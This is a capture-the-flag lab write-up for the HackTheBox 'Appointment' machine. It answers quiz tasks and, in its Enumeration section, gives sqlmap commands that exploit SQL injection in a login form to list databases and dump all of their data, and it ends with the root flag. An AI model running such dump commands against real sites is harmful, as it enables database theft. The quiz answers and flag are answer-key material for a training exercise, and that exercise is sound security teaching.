```
Platform: HackThebox
Challenge: Appointment
OS: Debian
Task: Web, Databases, Injection, Apache, MariaDB, PHP, SQL, Penetration Tester Level 1, Reconnaissance, SQL Injection
Tools Used: Nmap, SqlMap
Author: Paul B.
```
TASK 1

What does the acronym SQL stand for?
```
Structured Query Language
```

TASK 2

What is one of the most common type of SQL vulnerabilities?
```
SQL Injection
```

TASK 3

What does PII stand for?
```
Personally Identifiable Information
```

TASK 4

What does the OWASP Top 10 list name the classification for this vulnerability?
```
A03:2021-Injection
```

TASK 5

What service and version are running on port 80 of the target?
```
Apache httpd 2.4.38 ((Debian))
```

TASK 6

What is the standard port used for the HTTPS protocol?
```
443
```

TASK 7

What is one luck-based method of exploiting login pages?
```
```

TASK 8

What is a folder called in web-application terminology?
```
Directory
```

TASK 9

What response code is given for "Not Found" errors?
```
404
```

TASK 10

What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?
```
dir
```

TASK 11

What symbol do we use to comment out parts of the code?
```
#
```

### Enumeration
SQLMap
Command to enumerate databases
```
sqlmap -u "<Target-IP>" --data="username=test&password=test&form=submit" --method POST --dbs --batch
```
![HTB - Appointment - SQLMAP Dbs.png](:/0280196b134541b0bdedd036374f78d5)

Command to dump all data from database
```
sqlmap -u "<Target-IP>" --data="username=test&password=test&form=submit" --method POST -D appdb --dump all --batch
```
![HTB - Appointment - SQLMap Data.png](:/a74cb35737024fddaf8b72fb090779da)

SUBMIT FLAG

Submit root flag
```
e3d0796d002a446c0e622226f42e9672
```
